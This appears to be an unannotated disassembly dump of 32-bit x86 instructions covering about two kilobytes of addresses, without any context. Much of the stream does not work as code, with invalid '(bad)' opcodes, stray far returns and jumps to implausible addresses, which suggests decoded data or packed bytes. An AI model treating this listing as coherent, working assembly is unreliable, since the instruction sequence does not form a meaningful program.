  40e705:	clc    
  40e706:	gs inc ebp
  40e708:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e70e:	push   ss
  40e70f:	xor    ecx,DWORD PTR [ebp+0x3]
  40e712:	sub    edx,DWORD PTR [ecx-0x76]
  40e715:	dec    ebp
  40e716:	add    DWORD PTR [ebx+0x88d845],ecx
  40e71c:	mov    esi,DWORD PTR [ebx]
  40e71e:	or     BYTE PTR [ebx],al
  40e720:	cmp    edx,DWORD PTR [ecx-0x38]
  40e723:	dec    ebp
  40e724:	out    dx,eax
  40e725:	xor    eax,DWORD PTR [ebp+0x3]
  40e728:	mov    edx,DWORD PTR [ecx-0x28]
  40e72b:	dec    ebp
  40e72c:	add    BYTE PTR [ebx],dh
  40e72e:	push   0x518003
  40e733:	push   eax
  40e734:	add    BYTE PTR [ebx-0x300748b],cl
  40e73a:	sbb    BYTE PTR [ebp+0x45],cl
  40e73d:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e743:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e749:	dec    ebp
  40e74a:	inc    ebp
  40e74b:	xor    edx,esi
  40e74d:	add    edx,esi
  40e74f:	push   ecx
  40e750:	(bad)  
  40e751:	dec    ebp
  40e752:	mov    al,ds:0xc5e03dff
  40e757:	retf   
  40e758:	(bad)  
  40e759:	into   
  40e75a:	sub    bh,bh
  40e75c:	dec    esp
  40e75d:	adc    al,0x9c
  40e75f:	inc    ebp
  40e760:	push   ebp
  40e761:	test   DWORD PTR [edi],ecx
  40e763:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  40e76a:	jmp    0xc9b9f67e
  40e76f:	add    cl,dl
  40e771:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e77b:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e781:	rol    BYTE PTR [eax],0x54
  40e784:	clc    
  40e785:	gs jb  0x40e78f
  40e788:	mov    eax,DWORD PTR [ebp-0x30]
  40e78b:	xor    al,0x40
  40e78d:	sub    al,0xc7
  40e78f:	mov    ah,ch
  40e791:	add    DWORD PTR [ebp+0x4534f845],eax
  40e797:	sub    al,0x80
  40e799:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e7a0:	mov    ch,0xff
  40e7a2:	clc    
  40e7a3:	add    DWORD PTR [ebp+0x60],0x3d
  40e7a7:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e7ae:	inc    ebp
  40e7af:	dec    DWORD PTR [ebx-0x341ff701]
  40e7b5:	test   esi,ecx
  40e7b7:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e7bd:	push   eax
  40e7be:	add    DWORD PTR [ebp+0x0],eax
  40e7c1:	dec    ebx
  40e7c3:	or     al,0xce
  40e7c5:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e7cc:	into   
  40e7cd:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e7d3:	mov    esi,ecx
  40e7d5:	sar    bh,0x45
  40e7d8:	adc    al,0x8b
  40e7da:	clc    
  40e7db:	fadd   DWORD PTR [ebp+0x0]
  40e7de:	mov    ebp,DWORD PTR [edx+0x8]
  40e7e1:	push   edi
  40e7e2:	adc    BYTE PTR [eax+0x1],0x83
  40e7e6:	add    al,al
  40e7e8:	retf   
  40e7e9:	mov    ecx,esi
  40e7eb:	cld    
  40e7ec:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e7f2:	into   
  40e7f3:	add    BYTE PTR [ebx+0x756aec00],cl
  40e7f9:	jne    0x40e82e
  40e7fb:	inc    DWORD PTR [ebx]
  40e7fd:	rcl    BYTE PTR [ecx+0x50],1
  40e800:	push   eax
  40e801:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e807:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e80e:	sar    bh,0x84
  40e811:	or     BYTE PTR [ebx],al
  40e813:	push   eax
  40e814:	add    BYTE PTR [ebx+0x453cc845],cl
  40e81a:	pushf  
  40e81b:	xor    edi,eax
  40e81d:	pushf  
  40e81e:	mov    ah,0x89
  40e820:	test   eax,ebp
  40e822:	clc    
  40e823:	inc    ebp
  40e824:	inc    ebp
  40e825:	mov    DWORD PTR [eax+eax*8],esi
  40e828:	sub    al,0x32
  40e82a:	mov    BYTE PTR [ebx+ecx*4+0x54d8ec89],bl
  40e831:	dec    ebp
  40e832:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e836:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  40e83c:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e840:	or     DWORD PTR [ecx+0x45ff085c],0x0
  40e847:	shl    DWORD PTR [ebp-0x380064],1
  40e84d:	int3   
  40e84e:	lea    eax,[ebp+0x45fff860]
  40e854:	push   eax
  40e855:	cmp    al,0x75
  40e857:	pushf  
  40e858:	(bad)  
  40e859:	(bad)  
  40e85a:	pop    esp
  40e85b:	lods   al,BYTE PTR ds:[esi]
  40e85c:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e862:	mov    edi,DWORD PTR [esi]
  40e864:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e86b:	test   DWORD PTR [edi-0x8],edx
  40e86e:	inc    esi
  40e86f:	inc    ebp
  40e870:	add    BYTE PTR [eax],bh
  40e872:	push   0x8b809c
  40e877:	in     al,dx
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	mov    esi,DWORD PTR [ebx]
  40e87c:	cld    
  40e87d:	add    eax,DWORD PTR [eax+0xf013b]
  40e883:	adc    al,0x0
  40e885:	add    bh,bh
  40e887:	jmp    0xbde9a4
  40e88c:	add    BYTE PTR [ebp+0x45],cl
  40e88f:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e895:	dec    ebp
  40e896:	push   0x38033
  40e89b:	cmp    eax,DWORD PTR [eax]
  40e89d:	unpcklps xmm7,xmm0
  40e8a0:	jne    0x40e8a2
  40e8a2:	dec    DWORD PTR [ebx+0x5545cc18]
  40e8a8:	mov    DWORD PTR [ebx],esi
  40e8aa:	shl    BYTE PTR [ebx],1
  40e8ac:	inc    ebp
  40e8ad:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e8b3:	retf   0x5575
  40e8b6:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e8bc:	(bad)  
  40e8bd:	stc    
  40e8be:	in     al,dx
  40e8bf:	or     al,0x85
  40e8c1:	dec    ebp
  40e8c2:	clc    
  40e8c3:	xor    eax,DWORD PTR [ebp+0x3]
  40e8c6:	mov    ebp,ecx
  40e8c8:	rol    BYTE PTR [eax],1
  40e8ca:	inc    ebp
  40e8cb:	add    BYTE PTR [eax-0x7747ab3],bh
  40e8d1:	clc    
  40e8d2:	inc    ebp
  40e8d3:	retf   
  40e8d4:	mov    edx,ebx
  40e8d6:	in     al,dx
  40e8d7:	(bad)  
  40e8d8:	retf   
  40e8d9:	into   
  40e8da:	into   
  40e8db:	scas   eax,DWORD PTR es:[edi]
  40e8dc:	dec    ebp
  40e8dd:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e8e3:	sub    ecx,esi
  40e8e5:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e8e8:	(bad)  
  40e8e9:	mov    edi,eax
  40e8eb:	int3   
  40e8ec:	test   DWORD PTR [ecx-0x74baff08],ecx
  40e8f2:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40e8f9:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e8ff:	(bad)  
  40e901:	retf   0x559c
  40e904:	(bad)  
  40e905:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40e90c:	inc    ebp
  40e90d:	add    eax,0xeb9c4d3f
  40e912:	(bad)  
  40e913:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40e919:	xor    ecx,DWORD PTR [ebp+0x33]
  40e91c:	mov    eax,DWORD PTR [ebx]
  40e91e:	call   0xce50b426
  40e923:	retf   0x55d1
  40e926:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40e92c:	jmp    0x40e927
  40e92e:	add    BYTE PTR ds:0xebf44d8b,al
  40e934:	push   ebp
  40e935:	mov    ebp,DWORD PTR [ebx]
  40e937:	mov    eax,0x33f8558b
  40e93c:	retf   
  40e93d:	xor    ecx,esi
  40e93f:	add    edx,ecx
  40e941:	add    eax,DWORD PTR [edx+0xca010f]
  40e947:	push   ebp
  40e948:	dec    ebp
  40e949:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40e94f:	stc    
  40e950:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e956:	scas   eax,DWORD PTR es:[edi]
  40e957:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40e95d:	xor    ebp,DWORD PTR [ebx]
  40e95f:	xor    edi,DWORD PTR [ebx]
  40e961:	add    esi,DWORD PTR [edi+0x3]
  40e964:	mov    ecx,DWORD PTR [edi]
  40e966:	clc    
  40e967:	retf   0x55cb
  40e96a:	into   
  40e96b:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40e972:	test   al,0x4d
  40e974:	push   ebp
  40e975:	jbe    0x40e9aa
  40e977:	mov    esi,DWORD PTR [ebx]
  40e979:	mov    al,0x3
  40e97b:	push   ebp
  40e97c:	add    esi,DWORD PTR [ebx]
  40e97e:	rdpmc  
  40e980:	retf   0x5503
  40e983:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40e989:	dec    ebp
  40e98a:	stc    
  40e98b:	mov    ecx,DWORD PTR [eax]
  40e98d:	or     BYTE PTR [ebp+0x4d],cl
  40e990:	jmp    0x134ea20
  40e995:	dec    ebp
  40e996:	dec    ebp
  40e997:	(bad)  
  40e998:	mov    ebx,esp
  40e99a:	clc    
  40e99b:	test   ebx,ecx
  40e99d:	clc    
  40e99e:	ror    DWORD PTR [ebp-0x2a],cl
  40e9a1:	mov    esi,ecx
  40e9a3:	lock scas eax,DWORD PTR es:[edi]
  40e9a5:	inc    ebp
  40e9a6:	mov    esi,DWORD PTR [ebx]
  40e9a8:	hlt    
  40e9a9:	pushf  
  40e9aa:	jge    0x40e937
  40e9ac:	sub    ebx,esp
  40e9ae:	cmp    ecx,ebx
  40e9b0:	ja     0x40e980
  40e9b2:	mov    ebp,DWORD PTR [eax-0x58]
  40e9b5:	dec    ebp
  40e9b6:	xor    ecx,DWORD PTR [di+0x3]
  40e9ba:	mov    esp,esp
  40e9bc:	clc    
  40e9bd:	push   ebp
  40e9be:	retf   
  40e9bf:	mov    dl,bl
  40e9c1:	adc    esi,edx
  40e9c3:	jb     0x40e993
  40e9c5:	add    BYTE PTR [edi-0xb7474b3],ch
  40e9cb:	lock jge 0x40e999
  40e9ce:	sub    ecx,DWORD PTR [ebp+0x3b]
  40e9d1:	mov    esi,DWORD PTR [edi-0x20]
  40e9d4:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  40e9db:	mov    BYTE PTR [ebx-0x34b20729],cl
  40e9e1:	mov    edx,ebx
  40e9e3:	lock (bad) 
  40e9e5:	ror    esi,cl
  40e9e7:	push   ebp
  40e9e8:	scas   eax,DWORD PTR es:[edi]
  40e9e9:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40e9ef:	fwait
  40e9f0:	sub    esi,DWORD PTR [edx]
  40e9f2:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9f9:	xor    esp,DWORD PTR [ebx]
  40e9fb:	add    ecx,DWORD PTR [ebp-0x1c]
  40e9fe:	mov    edi,DWORD PTR [ebp-0x8]
  40ea01:	mov    bl,cl
  40ea03:	cmp    dl,bl
  40ea05:	jb     0x40e9d5
  40ea07:	add    dh,dl
  40ea09:	dec    ebp
  40ea0a:	scas   eax,DWORD PTR es:[edi]
  40ea0b:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40ea11:	shr    DWORD PTR [ebx],cl
  40ea13:	into   
  40ea14:	cmp    edx,esi
  40ea16:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40ea1c:	dec    ebp
  40ea1d:	dec    ebp
  40ea1e:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40ea24:	retf   
  40ea25:	xor    edx,esi
  40ea27:	add    ecx,esi
  40ea29:	imul   ecx,edx
  40ea2c:	mov    DWORD PTR [ebp+0x8],edx
  40ea2f:	xor    ecx,DWORD PTR [ebp+0x2b]
  40ea32:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40ea38:	add    esi,DWORD PTR [ebx]
  40ea3a:	rol    BYTE PTR [ebx],0x45
  40ea3d:	rdtsc  
  40ea3f:	xlat   BYTE PTR ds:[ebx]
  40ea40:	pushf  
  40ea41:	jge    0x40e9cc
  40ea43:	xor    esp,eax
  40ea45:	sub    eax,DWORD PTR [ebp-0x73]
  40ea48:	(bad)  
  40ea49:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40ea50:	dec    ebp
  40ea51:	xchg   BYTE PTR [ebx],dh
  40ea53:	inc    DWORD PTR [ebx]
  40ea55:	(bad)  
  40ea56:	jmp    0x40eaa5
  40ea58:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40ea5e:	dec    ebp
  40ea5f:	into   
  40ea60:	mov    ebp,DWORD PTR [edi-0x23737420]
  40ea66:	fwait
  40ea67:	shl    DWORD PTR [edx],cl
  40ea69:	retf   0x5588
  40ea6c:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40ea72:	add    eax,DWORD PTR [eax]
  40ea74:	in     al,0x4d
  40ea76:	push   ebp
  40ea77:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40ea7d:	gs add ch,cl
  40ea80:	dec    ebp
  40ea81:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40ea87:	dec    ebp
  40ea88:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40ea8e:	jge    0x40ea5e
  40ea90:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ea96:	add    cl,dh
  40ea98:	dec    ebp
  40ea99:	dec    DWORD PTR [ebx-0x2c032301]
  40ea9f:	inc    ebp
  40eaa0:	push   ebp
  40eaa1:	dec    DWORD PTR [ebx-0x73ff1f34]
  40eaa7:	lea    ebx,[ebx-0x7400cdac]
  40eaad:	push   eax
  40eaae:	mov    ah,0x45
  40eab0:	push   ebp
  40eab1:	mov    esi,DWORD PTR [ebx]
  40eab3:	les    esi,FWORD PTR [ebx]
  40eab5:	add    BYTE PTR [ebx],al
  40eab7:	inc    DWORD PTR [ebx]
  40eab9:	mov    ecx,DWORD PTR [edi]
  40eabb:	cld    
  40eabc:	retf   0x4d80
  40eabf:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40eac5:	jne    0x40ea52
  40eac7:	(bad)  
  40eac8:	in     al,dx
  40eac9:	ror    bl,1
  40eacb:	scas   al,BYTE PTR es:[edi]
  40eacc:	into   
  40eacd:	add    BYTE PTR [edi-0xf2f7475],ch
  40ead3:	not    bl
  40ead5:	adc    al,0xca
  40ead7:	inc    ebp
  40ead8:	push   ebp
  40ead9:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40eadf:	push   0xaf80d6
  40eae4:	mov    eax,DWORD PTR [eax]
  40eae6:	fdiv   st(7),st
  40eae8:	sti    
  40eae9:	sbb    dh,cl
  40eaeb:	pop    esi
  40eaec:	xchg   esp,eax
  40eaed:	leave  
  40eaee:	fwait
  40eaef:	add    al,0x32
  40eaf1:	push   ebp
  40eaf2:	cmp    ebp,esp
  40eaf4:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40eaf8:	dec    DWORD PTR [ecx-0x740f0375]
  40eafe:	push   ebp
  40eaff:	cld    
  40eb00:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40eb06:	retf   0x558b
  40eb09:	clc    
  40eb0a:	xor    esi,eax
  40eb0c:	add    esi,DWORD PTR [ebp-0x75]
  40eb0f:	(bad)  
  40eb10:	hlt    
  40eb11:	or     cl,BYTE PTR [esi+eax*8-0x39cdf765]
  40eb18:	mov    DWORD PTR [edx],ecx
  40eb1a:	hlt    
  40eb1b:	(bad)  
  40eb1c:	dec    ebp
  40eb1d:	add    dh,BYTE PTR [ebx]
  40eb1f:	leave  
  40eb20:	mov    edx,0xffec8d55
  40eb25:	push   ecx
  40eb26:	rol    DWORD PTR [ebp+0x55],1
  40eb29:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40eb2f:	mov    eax,0xf8030b33
  40eb34:	lar    ecx,di
  40eb37:	push   ebp
  40eb38:	retf   0x863b
  40eb3b:	jne    0x40eb3a
  40eb3d:	mov    edi,edi
  40eb3f:	or     BYTE PTR [ebp+0x41],dh
  40eb42:	mov    ebp,edx
  40eb44:	cld    
  40eb45:	inc    eax
  40eb46:	mov    al,0x25
  40eb48:	add    DWORD PTR [ecx+0x0],eax
  40eb4b:	in     eax,dx
  40eb4c:	test   DWORD PTR [ecx-0x1],eax
  40eb4f:	(bad)  
  40eb51:	ret    0x8b
  40eb54:	cld    
  40eb55:	mov    eax,DWORD PTR [eax+0x8d0151]
  40eb5b:	clc    
  40eb5c:	xor    BYTE PTR [ebp+0x45],al
  40eb5f:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40eb65:	loopne 0x40eb66
  40eb67:	mov    edi,edi
  40eb69:	mov    ecx,eax
  40eb6b:	clc    
  40eb6c:	jne    0x40eb3e
  40eb6e:	call   0x81fc77
  40eb73:	and    eax,0xc6854575
  40eb78:	je     0x40eb7b
  40eb7a:	mov    eax,esi
  40eb7c:	cld    
  40eb7d:	or     DWORD PTR [eax+0x401c9],eax
  40eb83:	push   ebp
  40eb84:	add    ah,ch
  40eb86:	add    BYTE PTR [ecx+0x6a],dl
  40eb89:	inc    ebp
  40eb8a:	push   esi
  40eb8b:	mov    DWORD PTR [eax-0x4],edx
  40eb8e:	pop    edi
  40eb8f:	mov    ebx,DWORD PTR [ebx-0x4]
  40eb92:	ret    0xb8
  40eb95:	push   es
  40eb96:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40eb9c:	clc    
  40eb9d:	lock inc ebp
  40eb9f:	jne    0x40ebf7
  40eba1:	(bad)  
  40eba2:	jne    0x40eba8
  40eba4:	mov    eax,0xf841ba66
  40eba9:	fiadd  DWORD PTR [esi]
  40ebab:	(bad)  
  40ebac:	jne    0x40ebeb
  40ebae:	cmp    eax,ebx
  40ebb0:	pop    esi
  40ebb1:	mov    ecx,DWORD PTR [eax]
  40ebb3:	push   ecx
  40ebb4:	inc    ecx
  40ebb5:	lea    edi,[esi-0x8]
  40ebb8:	inc    edx
  40ebb9:	inc    ebp
  40ebba:	int    0x8b
  40ebbc:	inc    edx
  40ebbd:	cld    
  40ebbe:	jle    0x40eb7f
  40ebc0:	inc    ecx
  40ebc1:	xchg   eax,esp
  40ebc3:	mov    ebx,eax
  40ebc5:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ebcb:	or     edi,eax
  40ebcd:	inc    ebp
  40ebce:	inc    ebp
  40ebcf:	(bad)  
  40ebd0:	mov    ecx,DWORD PTR [eax]
  40ebd2:	cld    
  40ebd3:	(bad)  
  40ebd4:	jmp    0x40ebd7
  40ebd6:	mov    eax,esi
  40ebd8:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ebde:	rcl    BYTE PTR [esi+0xf],1
  40ebe1:	iret   
  40ebe2:	inc    ebp
  40ebe3:	leave  
  40ebe4:	(bad)  
  40ebe5:	dec    DWORD PTR [ecx]
  40ebe7:	mov    eax,esi
  40ebe9:	mov    eax,DWORD PTR [edi]
  40ebeb:	mov    dh,0xdd
  40ebee:	push   es
  40ebef:	nop
  40ebf0:	(bad)  
  40ebf1:	inc    DWORD PTR [ebx]
  40ebf3:	push   esi
  40ebf4:	leave  
  40ebf5:	iret   
  40ebf6:	add    al,0x46
  40ebf8:	push   ebp
  40ebf9:	jmp    0xff9241ea
  40ebfe:	inc    ebp
  40ebff:	push   esi
  40ec00:	mov    DWORD PTR [esi-0x4],eax
  40ec03:	in     eax,dx
  40ec04:	push   ebp
  40ec05:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ec0b:	add    al,BYTE PTR [edx]
  40ec0d:	mov    edx,DWORD PTR [ebp-0x17]
  40ec10:	cmp    edi,esi
  40ec12:	jne    0x40ec13
  40ec14:	(bad)  
  40ec15:	push   esi
  40ec16:	pop    es
  40ec17:	push   ebp
  40ec18:	mov    ebp,esp
  40ec1a:	or     BYTE PTR [ebp+0x41],al
  40ec1d:	add    edi,esp
  40ec1f:	sub    BYTE PTR [eax-0x4],al
  40ec22:	retf   0xc275
  40ec25:	add    DWORD PTR [eax],eax
  40ec27:	sbb    al,0x8b
  40ec29:	mov    edx,DWORD PTR [ecx+0x14]
  40ec2c:	lea    edx,[edx-0x1ba7508]
  40ec32:	push   esi
  40ec33:	enter  0xd375,0xb8
  40ec37:	test   DWORD PTR [esi],0x6ce0750
  40ec3d:	enter  0xd375,0x3b
  40ec41:	neg    DWORD PTR [esi+0x50]
  40ec44:	or     cl,dl
  40ec46:	inc    edx
  40ec47:	(bad)  
  40ec48:	loope  0x40ec36
  40ec4a:	(bad)  
  40ec4b:	sub    eax,DWORD PTR [ebx]
  40ec4d:	inc    eax
  40ec4e:	loope  0x40eca0
  40ec50:	add    dl,BYTE PTR [eax-0x37]
  40ec53:	push   edi
  40ec54:	push   ebp
  40ec55:	imul   ah
  40ec57:	adc    DWORD PTR [ecx-0x1],0x45
  40ec5b:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ec61:	lea    edi,[eax-0x7fff4ca]
  40ec67:	mov    eax,0x4550402
  40ec6c:	cmp    ebp,ecx
  40ec6e:	jne    0x40ec1b
  40ec70:	mov    eax,DWORD PTR ds:0x241e808
  40ec76:	in     eax,dx
  40ec77:	add    BYTE PTR [eax-0x7],al
  40ec7a:	out    0x36,eax
  40ec7c:	inc    ecx
  40ec7d:	aas    
  40ec7e:	jmp    0xccaf00
  40ec83:	lock mov edi,DWORD PTR [ebp-0x18]
  40ec87:	and    edi,edi
  40ec89:	mov    edi,edi
  40ec8b:	call   0xe40eed67
  40ec90:	push   es
  40ec91:	add    al,ch
  40ec93:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40ec9a:	(bad)  
  40ec9b:	hlt    
  40ec9c:	add    eax,0xffd3e87d
  40eca1:	cmp    bh,0x8
  40eca4:	(bad)  
  40eca5:	fld    DWORD PTR [esi]
  40eca7:	out    dx,al
  40eca8:	call   0xff9febb0
  40ecad:	cmp    al,0x46
  40ecaf:	shl    eax,0x8
  40ecb2:	(bad)  
  40ecb3:	pop    es
  40ecb4:	fisttp QWORD PTR [ebp+0xe577eff]
  40ecba:	push   ebx
  40ecbb:	add    BYTE PTR [ebx+0x24008b56],cl
  40ecc1:	add    BYTE PTR [ebp+0x50],al
  40ecc4:	push   eax
  40ecc5:	add    DWORD PTR [ebx+0x757d1834],ecx
  40eccb:	sub    edx,DWORD PTR [esi-0x24]
  40ecce:	jne    0x40ec86
  40ecd0:	lods   eax,DWORD PTR ds:[esi]
  40ecd1:	mov    edx,DWORD PTR [edx-0x34]
  40ecd4:	dec    esi
  40ecd5:	out    0x83,eax
  40ecd7:	into   
  40ecd8:	push   edi
  40ecda:	loopne 0x40ecaa
  40ecdc:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40ece0:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ece7:	rol    DWORD PTR [edx],0x8
  40ecea:	mov    esp,ecx
  40ecec:	cmp    DWORD PTR [ebx],0xc
  40ecef:	mov    esi,0x5001c0
  40ecf4:	push   eax
  40ecf5:	push   cs
  40ecf6:	push   eax
  40ecf7:	(bad)  
  40ecf8:	sub    edx,edi
  40ecfa:	push   esi
  40ecfb:	adc    al,0xcb
  40ecfd:	ins    DWORD PTR es:[edi],dx
  40ecfe:	mov    eax,0x203e8
  40ed03:	add    al,ah
  40ed05:	inc    esi
  40ed06:	mov    al,ch
  40ed08:	pop    es
  40ed09:	add    DWORD PTR [eax],0x1
  40ed0c:	add    dh,al
  40ed0e:	add    ah,ch
  40ed10:	rol    DWORD PTR [edx-0xd],1
  40ed13:	cli    
  40ed14:	push   0x4a
  40ed16:	pop    ecx
  40ed17:	retf   0xfe6
  40ed1a:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ed20:	(bad)  
  40ed21:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ed27:	(bad)  
  40ed28:	sub    ebp,DWORD PTR [ebx]
  40ed2a:	and    al,0x52
  40ed2c:	(bad)  
  40ed2d:	dec    edi
  40ed2e:	inc    ebp
  40ed2f:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ed36:	add    BYTE PTR [ebp-0x7b],dh
  40ed39:	pop    eax
  40ed3a:	add    BYTE PTR [edx+0x0],bl
  40ed3d:	pop    edx
  40ed3e:	dec    ebp
  40ed3f:	jmp    DWORD PTR [ebx]
  40ed41:	and    al,0xec
  40ed43:	push   edx
  40ed44:	out    0x64,eax
  40ed46:	jmp    0xd3f2e34b
  40ed4b:	jmp    0x40eda5
  40ed4d:	mov    al,0xfe
  40ed4f:	dec    BYTE PTR [ebp-0x18fd8018]
  40ed55:	add    BYTE PTR [esi+ebp*1],bh
  40ed58:	pop    edx
  40ed59:	icebp  
  40ed5a:	mov    eax,cs
  40ed5c:	ins    BYTE PTR es:[edi],dx
  40ed5d:	adc    eax,0x75510000
  40ed62:	mov    esi,0x70158
  40ed67:	or     DWORD PTR [eax-0x74f48dfe],esi
  40ed6d:	mov    edi,esp
  40ed6f:	cld    
  40ed70:	jge    0x40ede7
  40ed72:	(bad)  
  40ed74:	aas    
  40ed75:	and    al,0x6d
  40ed77:	adc    cl,0x1
  40ed7a:	mov    eax,DWORD PTR [eax]
  40ed7c:	and    ecx,DWORD PTR [ebx-0x167203fd]
  40ed82:	dec    ebp
  40ed83:	add    eax,ebp
  40ed85:	add    BYTE PTR [edx],al
  40ed87:	fadd   DWORD PTR [eax]
  40ed89:	stc    
  40ed8a:	enter  0xee00,0x8b
  40ed8e:	sbb    eax,0x1
  40ed91:	sbb    esi,ecx
  40ed93:	in     al,0x0
  40ed95:	in     eax,dx
  40ed96:	add    BYTE PTR [eax],al
  40ed98:	jne    0x40ed25
  40ed9a:	cmp    edx,esp
  40ed9c:	jb     0x40eda7
  40ed9e:	jmp    0x40ee15
  40eda0:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  40eda6:	add    BYTE PTR [ebx+0x4d83d840],cl
  40edac:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  40edb2:	jb     0x40ed3d
  40edb4:	pop    edx
  40edb5:	fadd   QWORD PTR [ebx-0x7445faa1]
  40edbb:	or     dh,BYTE PTR [edx+0x0]
  40edbe:	inc    edx
  40edbf:	or     dl,bh
  40edc1:	xlat   BYTE PTR ds:[ebx]
  40edc2:	dec    edx
  40edc3:	push   edi
  40edc4:	add    al,0x7
  40edc6:	leave  
  40edc7:	rol    DWORD PTR [edx+eax*1],0x7
  40edcb:	add    ecx,ecx
  40edcd:	mov    edx,ecx
  40edcf:	int3   
  40edd0:	jmp    0x40ed90
  40edd2:	mov    al,0x0
  40edd4:	(bad)  
  40edd5:	jne    0x40edbf
  40edd7:	mov    eax,DWORD PTR [edx]
  40edd9:	call   0xc1556ade
  40edde:	pop    edi
  40eddf:	add    ebx,DWORD PTR [ecx-0x37]
  40ede2:	pop    ecx
  40ede3:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  40edea:	push   es
  40edeb:	mov    eax,DWORD PTR [eax]
  40eded:	int3   
  40edee:	add    ch,al
  40edf0:	jae    0x40edda
  40edf2:	int    0x1
  40edf4:	enter  0x3000,0x18
  40edf8:	add    BYTE PTR [ebp+0x75],al
  40edfb:	mov    esi,DWORD PTR [eax-0x171f0134]
  40ee01:	push   0x2
  40ee03:	pop    ecx
  40ee04:	add    BYTE PTR [eax],cl
  40ee06:	push   ebx
  40ee07:	lea    edi,[edi+eax*2]
  40ee0a:	mov    al,0x1
  40ee0c:	jb     0x40ee0e
  40ee0e:	mov    al,0x10
  40ee10:	push   eax
  40ee11:	add    al,0x75
  40ee13:	add    BYTE PTR [ebx],ch
  40ee15:	add    ebx,esp
  40ee17:	int3   
  40ee18:	jne    0x40ee2a
  40ee1a:	movsx  edx,cl
  40ee1d:	add    DWORD PTR [eax],eax
  40ee1f:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  40ee26:	mov    gs,edi
  40ee28:	add    BYTE PTR [eax-0x50],ch
  40ee2b:	add    al,ch
  40ee2d:	mov    eax,DWORD PTR [ecx]
  40ee2f:	sub    eax,DWORD PTR [eax]
  40ee31:	jb     0x40eea8
  40ee33:	add    DWORD PTR [esp+eiz*8-0x50],esi
  40ee37:	jge    0x40ee21
  40ee39:	add    al,0x1
  40ee3b:	add    DWORD PTR [eax],0x0
  40ee3e:	jne    0x40ee40
  40ee40:	je     0x40ee87
  40ee42:	mov    eax,DWORD PTR [edi]
  40ee44:	ror    BYTE PTR [ebp+0x4d],1
  40ee47:	or     DWORD PTR [ecx+0x4d03d004],0x3
  40ee4e:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  40ee54:	mov    DWORD PTR [ebx],ebp
  40ee56:	fadd   DWORD PTR [eax+0x75]
  40ee59:	inc    eax
  40ee5a:	pop    eax
  40ee5b:	lea    ebx,[ecx+0x4f]
  40ee5e:	push   0xb1000003
  40ee63:	out    dx,eax
  40ee64:	add    ebp,DWORD PTR [edx+edx*2]
  40ee67:	add    BYTE PTR [ebx+ecx*4],bh
